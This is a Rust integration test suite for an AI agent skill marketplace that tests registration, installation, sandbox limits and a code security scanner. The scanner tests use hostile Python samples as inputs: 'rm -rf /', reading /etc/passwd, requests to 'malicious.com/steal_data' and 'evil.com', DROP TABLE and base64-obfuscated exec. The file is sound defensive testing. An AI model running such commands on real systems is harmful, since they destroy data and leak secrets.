/// Agent Skills System Integration Tests
/// DO-178C Level A Compliant Test Suite
/// 
/// Comprehensive test coverage for skill registration, installation,
/// execution, security validation, and marketplace functionality.

#[cfg(test)]
mod skills_tests {
    use diesel::prelude::*;
    use diesel_async::{AsyncPgConnection, RunQueryDsl};
    use clawmesh_skills::{
        models::{AgentSkill, AgentSkillForm, SkillType},
        skills::{
            register_skill,
            get_skill,
            get_agent_skills,
            install_skill,
            execute_skill,
            delete_skill,
        },
        security::{
            validate_skill_code,
            comprehensive_security_scan,
        },
        sandbox::SandboxBuilder,
        marketplace::{
            publish_skill,
            search_skills,
            get_marketplace_stats,
        },
    };

    // ========================================================================
    // Test Utilities
    // ========================================================================

    async fn setup_test_db() -> AsyncPgConnection {
        let database_url = std::env::var("DATABASE_URL")
            .unwrap_or_else(|_| "postgres://postgres:password@localhost/lemmy_test".to_string());
        
        AsyncPgConnection::establish(&database_url)
            .await
            .expect("Failed to connect to test database")
    }

    async fn create_test_person(conn: &mut AsyncPgConnection, name: &str, is_agent: bool) -> i32 {
        use lemmy_db_schema::schema::person;
        use lemmy_db_schema::source::person::{Person, PersonInsertForm};
        
        let form = PersonInsertForm {
            name: name.to_string(),
            user_type: if is_agent { "agent" } else { "user" }.to_string(),
            ..Default::default()
        };
        
        diesel::insert_into(person::table)
            .values(&form)
            .returning(person::id)
            .get_result(conn)
            .await
            .expect("Failed to create test person")
    }

    async fn cleanup_test_data(conn: &mut AsyncPgConnection) {
        use lemmy_db_schema::schema::person;
        
        diesel::delete(person::table.filter(person::name.like("test_%")))
            .execute(conn)
            .await
            .ok();
    }

    // ========================================================================
    // Skill Registration Tests
    // ========================================================================

    #[tokio::test]
    async fn test_register_skill_success() {
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_agent_reg", true).await;
        
        let form = AgentSkillForm {
            agent_id,
            skill_name: "data_analyzer".to_string(),
            skill_type: SkillType::Custom as i32,
            skill_code: Some("def analyze(data):\n    return sum(data)".to_string()),
            skill_metadata: Some(serde_json::json!({
                "description": "Analyzes numerical data",
                "author": "test_agent_reg"
            })),
            version: "1.0.0".to_string(),
            is_public: true,
        };
        
        let result = register_skill(agent_id, form, &mut conn).await;
        assert!(result.is_ok(), "Skill registration should succeed");
        
        let skill = result.unwrap();
        assert_eq!(skill.skill_name, "data_analyzer");
        assert_eq!(skill.agent_id, agent_id);
        assert_eq!(skill.version, "1.0.0");
        assert_eq!(skill.is_public, true);
        assert_eq!(skill.is_verified, false);
        assert_eq!(skill.downloads, 0);
        
        cleanup_test_data(&mut conn).await;
    }

    #[tokio::test]
    async fn test_register_skill_duplicate_name() {
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_agent_dup", true).await;
        
        let form = AgentSkillForm {
            agent_id,
            skill_name: "duplicate_skill".to_string(),
            skill_type: SkillType::Custom as i32,
            skill_code: Some("def test(): pass".to_string()),
            skill_metadata: None,
            version: "1.0.0".to_string(),
            is_public: false,
        };
        
        // Register first time
        register_skill(agent_id, form.clone(), &mut conn).await.ok();
        
        // Try to register again with same name
        let result = register_skill(agent_id, form, &mut conn).await;
        assert!(result.is_err(), "Duplicate skill name should be rejected");
        
        cleanup_test_data(&mut conn).await;
    }

    #[tokio::test]
    async fn test_register_skill_invalid_version() {
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_agent_ver", true).await;
        
        let form = AgentSkillForm {
            agent_id,
            skill_name: "test_skill".to_string(),
            skill_type: SkillType::Custom as i32,
            skill_code: Some("def test(): pass".to_string()),
            skill_metadata: None,
            version: "invalid_version".to_string(),
            is_public: false,
        };
        
        let result = register_skill(agent_id, form, &mut conn).await;
        assert!(result.is_err(), "Invalid version format should be rejected");
        
        cleanup_test_data(&mut conn).await;
    }

    // ========================================================================
    // Security Validation Tests
    // ========================================================================

    #[test]
    fn test_validate_safe_code() {
        let safe_code = r#"
def calculate_sum(numbers):
    total = 0
    for num in numbers:
        total += num
    return total
"#;
        
        let result = validate_skill_code(safe_code);
        assert!(result.is_ok(), "Safe code should pass validation");
    }

    #[test]
    fn test_detect_sql_injection() {
        let malicious_code = r#"
import sqlite3
conn = sqlite3.connect('database.db')
conn.execute("DROP TABLE users")
"#;
        
        let result = validate_skill_code(malicious_code);
        assert!(result.is_err(), "SQL injection should be detected");
    }

    #[test]
    fn test_detect_command_injection() {
        let malicious_code = r#"
import os
os.system('rm -rf /')
"#;
        
        let result = validate_skill_code(malicious_code);
        assert!(result.is_err(), "Command injection should be detected");
    }

    #[test]
    fn test_detect_file_operations() {
        let malicious_code = r#"
with open('/etc/passwd', 'r') as f:
    data = f.read()
"#;
        
        let result = validate_skill_code(malicious_code);
        assert!(result.is_err(), "Unauthorized file access should be detected");
    }

    #[test]
    fn test_detect_network_requests() {
        let malicious_code = r#"
import requests
requests.get('http://malicious.com/steal_data')
"#;
        
        let result = validate_skill_code(malicious_code);
        assert!(result.is_err(), "Unauthorized network access should be detected");
    }

    #[test]
    fn test_detect_subprocess() {
        let malicious_code = r#"
import subprocess
subprocess.run(['curl', 'http://evil.com'])
"#;
        
        let result = validate_skill_code(malicious_code);
        assert!(result.is_err(), "Subprocess execution should be detected");
    }

    #[test]
    fn test_comprehensive_security_scan() {
        let malicious_code = r#"
import os
import subprocess
os.system('malicious_command')
"#;
        
        let scan_result = comprehensive_security_scan(malicious_code);
        assert!(!scan_result.is_safe, "Malicious code should fail security scan");
        assert!(!scan_result.threats.is_empty(), "Should detect threats");
        assert!(scan_result.risk_score > 0, "Should have risk score");
    }

    #[test]
    fn test_detect_crypto_mining() {
        let mining_code = r#"
import hashlib
while True:
    hashlib.sha256(b'mine_bitcoin').hexdigest()
"#;
        
        let scan_result = comprehensive_security_scan(mining_code);
        assert!(!scan_result.is_safe, "Crypto mining should be detected");
    }

    #[test]
    fn test_detect_code_obfuscation() {
        let obfuscated_code = r#"
exec(compile(__import__('base64').b64decode(b'aW1wb3J0IG9z'), '<string>', 'exec'))
"#;
        
        let scan_result = comprehensive_security_scan(obfuscated_code);
        assert!(!scan_result.is_safe, "Code obfuscation should be detected");
    }

    // ========================================================================
    // Skill Query Tests
    // ========================================================================

    #[tokio::test]
    async fn test_get_skill_success() {
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_agent_get", true).await;
        
        let form = AgentSkillForm {
            agent_id,
            skill_name: "test_skill_get".to_string(),
            skill_type: SkillType::Custom as i32,
            skill_code: Some("def test(): pass".to_string()),
            skill_metadata: None,
            version: "1.0.0".to_string(),
            is_public: false,
        };
        
        let skill = register_skill(agent_id, form, &mut conn)
            .await
            .expect("Should register skill");
        
        // Get skill by ID
        let retrieved = get_skill(skill.id, &mut conn)
            .await
            .expect("Should retrieve skill");
        
        assert_eq!(retrieved.id, skill.id);
        assert_eq!(retrieved.skill_name, "test_skill_get");
        
        cleanup_test_data(&mut conn).await;
    }

    #[tokio::test]
    async fn test_get_agent_skills() {
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_agent_list", true).await;
        
        // Register multiple skills
        for i in 0..3 {
            let form = AgentSkillForm {
                agent_id,
                skill_name: format!("skill_{}", i),
                skill_type: SkillType::Custom as i32,
                skill_code: Some("def test(): pass".to_string()),
                skill_metadata: None,
                version: "1.0.0".to_string(),
                is_public: false,
            };
            register_skill(agent_id, form, &mut conn).await.ok();
        }
        
        // Get all skills for agent
        let skills = get_agent_skills(agent_id, &mut conn)
            .await
            .expect("Should get agent skills");
        
        assert_eq!(skills.len(), 3);
        
        cleanup_test_data(&mut conn).await;
    }

    // ========================================================================
    // Skill Installation Tests
    // ========================================================================

    #[tokio::test]
    async fn test_install_skill_success() {
        let mut conn = setup_test_db().await;
        let owner_id = create_test_person(&mut conn, "test_owner", true).await;
        let installer_id = create_test_person(&mut conn, "test_installer", true).await;
        
        // Register a public skill
        let form = AgentSkillForm {
            agent_id: owner_id,
            skill_name: "installable_skill".to_string(),
            skill_type: SkillType::Shared as i32,
            skill_code: Some("def test(): pass".to_string()),
            skill_metadata: None,
            version: "1.0.0".to_string(),
            is_public: true,
        };
        
        let skill = register_skill(owner_id, form, &mut conn)
            .await
            .expect("Should register skill");
        
        // Install skill
        let result = install_skill(installer_id, skill.id, &mut conn).await;
        assert!(result.is_ok(), "Skill installation should succeed");
        
        cleanup_test_data(&mut conn).await;
    }

    #[tokio::test]
    async fn test_install_private_skill_rejected() {
        let mut conn = setup_test_db().await;
        let owner_id = create_test_person(&mut conn, "test_owner_priv", true).await;
        let installer_id = create_test_person(&mut conn, "test_installer_priv", true).await;
        
        // Register a private skill
        let form = AgentSkillForm {
            agent_id: owner_id,
            skill_name: "private_skill".to_string(),
            skill_type: SkillType::Custom as i32,
            skill_code: Some("def test(): pass".to_string()),
            skill_metadata: None,
            version: "1.0.0".to_string(),
            is_public: false,
        };
        
        let skill = register_skill(owner_id, form, &mut conn)
            .await
            .expect("Should register skill");
        
        // Try to install private skill
        let result = install_skill(installer_id, skill.id, &mut conn).await;
        assert!(result.is_err(), "Installing private skill should be rejected");
        
        cleanup_test_data(&mut conn).await;
    }

    // ========================================================================
    // Sandbox Tests
    // ========================================================================

    #[test]
    fn test_sandbox_builder_default() {
        let sandbox = SandboxBuilder::new().build();
        
        assert!(sandbox.max_memory > 0);
        assert!(sandbox.max_cpu_time.as_secs() > 0);
        assert!(!sandbox.network_access);
    }

    #[test]
    fn test_sandbox_builder_custom() {
        use std::time::Duration;
        
        let sandbox = SandboxBuilder::new()
            .with_max_memory(256 * 1024 * 1024) // 256MB
            .with_timeout(Duration::from_secs(10))
            .with_network_access(false)
            .build();
        
        assert_eq!(sandbox.max_memory, 256 * 1024 * 1024);
        assert_eq!(sandbox.max_cpu_time, Duration::from_secs(10));
        assert_eq!(sandbox.network_access, false);
    }

    #[test]
    fn test_sandbox_restrictive() {
        use clawmesh_skills::sandbox::SkillSandbox;
        
        let sandbox = SkillSandbox::restrictive();
        
        assert_eq!(sandbox.max_memory, 64 * 1024 * 1024); // 64MB
        assert_eq!(sandbox.max_cpu_time.as_secs(), 5);
        assert_eq!(sandbox.network_access, false);
    }

    // ========================================================================
    // Marketplace Tests
    // ========================================================================

    #[tokio::test]
    async fn test_publish_skill_success() {
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_publisher", true).await;
        
        let form = AgentSkillForm {
            agent_id,
            skill_name: "marketplace_skill".to_string(),
            skill_type: SkillType::Shared as i32,
            skill_code: Some("def test(): pass".to_string()),
            skill_metadata: Some(serde_json::json!({
                "description": "A skill for the marketplace",
                "tags": ["utility", "helper"]
            })),
            version: "1.0.0".to_string(),
            is_public: false, // Not public yet
        };
        
        let skill = register_skill(agent_id, form, &mut conn)
            .await
            .expect("Should register skill");
        
        // Publish to marketplace
        let result = publish_skill(skill.id, &mut conn).await;
        assert!(result.is_ok(), "Publishing should succeed");
        
        // Verify skill is now public
        let updated = get_skill(skill.id, &mut conn)
            .await
            .expect("Should get updated skill");
        assert_eq!(updated.is_public, true);
        
        cleanup_test_data(&mut conn).await;
    }

    #[tokio::test]
    async fn test_search_skills() {
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_searcher", true).await;
        
        // Register and publish multiple skills
        for i in 0..3 {
            let form = AgentSkillForm {
                agent_id,
                skill_name: format!("searchable_skill_{}", i),
                skill_type: SkillType::Shared as i32,
                skill_code: Some("def test(): pass".to_string()),
                skill_metadata: Some(serde_json::json!({
                    "description": format!("Skill number {}", i),
                    "tags": ["search", "test"]
                })),
                version: "1.0.0".to_string(),
                is_public: true,
            };
            register_skill(agent_id, form, &mut conn).await.ok();
        }
        
        // Search for skills
        let results = search_skills("searchable", 10, 0, &mut conn)
            .await
            .expect("Should search skills");
        
        assert!(results.len() >= 3, "Should find at least 3 skills");
        
        cleanup_test_data(&mut conn).await;
    }

    #[tokio::test]
    async fn test_marketplace_stats() {
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_stats", true).await;
        
        // Register some public skills
        for i in 0..5 {
            let form = AgentSkillForm {
                agent_id,
                skill_name: format!("stats_skill_{}", i),
                skill_type: SkillType::Shared as i32,
                skill_code: Some("def test(): pass".to_string()),
                skill_metadata: None,
                version: "1.0.0".to_string(),
                is_public: true,
            };
            register_skill(agent_id, form, &mut conn).await.ok();
        }
        
        // Get marketplace stats
        let stats = get_marketplace_stats(&mut conn)
            .await
            .expect("Should get stats");
        
        assert!(stats.total_skills >= 5);
        assert!(stats.total_downloads >= 0);
        
        cleanup_test_data(&mut conn).await;
    }

    // ========================================================================
    // Integration Tests
    // ========================================================================

    #[tokio::test]
    async fn test_full_skill_lifecycle() {
        let mut conn = setup_test_db().await;
        
        // 1. Create agent
        let agent_id = create_test_person(&mut conn, "test_lifecycle_skill", true).await;
        
        // 2. Register skill
        let form = AgentSkillForm {
            agent_id,
            skill_name: "lifecycle_skill".to_string(),
            skill_type: SkillType::Custom as i32,
            skill_code: Some("def process(x): return x * 2".to_string()),
            skill_metadata: Some(serde_json::json!({
                "description": "Doubles the input"
            })),
            version: "1.0.0".to_string(),
            is_public: false,
        };
        
        let skill = register_skill(agent_id, form, &mut conn)
            .await
            .expect("Should register skill");
        
        assert_eq!(skill.skill_name, "lifecycle_skill");
        
        // 3. Publish to marketplace
        publish_skill(skill.id, &mut conn)
            .await
            .expect("Should publish");
        
        // 4. Another agent installs it
        let installer_id = create_test_person(&mut conn, "test_installer_life", true).await;
        install_skill(installer_id, skill.id, &mut conn)
            .await
            .expect("Should install");
        
        // 5. Execute skill (would require sandbox implementation)
        // let result = execute_skill(installer_id, skill.id, "5", &mut conn).await;
        // assert!(result.is_ok());
        
        // 6. Delete skill
        let delete_result = delete_skill(skill.id, agent_id, &mut conn).await;
        assert!(delete_result.is_ok(), "Should delete skill");
        
        cleanup_test_data(&mut conn).await;
    }

    // ========================================================================
    // Performance Tests
    // ========================================================================

    #[tokio::test]
    async fn test_bulk_skill_registration() {
        use std::time::Instant;
        
        let mut conn = setup_test_db().await;
        let agent_id = create_test_person(&mut conn, "test_bulk", true).await;
        
        let start = Instant::now();
        
        // Register 10 skills
        for i in 0..10 {
            let form = AgentSkillForm {
                agent_id,
                skill_name: format!("bulk_skill_{}", i),
                skill_type: SkillType::Custom as i32,
                skill_code: Some("def test(): pass".to_string()),
                skill_metadata: None,
                version: "1.0.0".to_string(),
                is_public: false,
            };
            register_skill(agent_id, form, &mut conn)
                .await
                .expect("Should register");
        }
        
        let duration = start.elapsed();
        
        // Should complete in reasonable time (< 5 seconds for 10 skills)
        assert!(duration.as_secs() < 5, "Bulk registration should be fast");
        
        cleanup_test_data(&mut conn).await;
    }
}
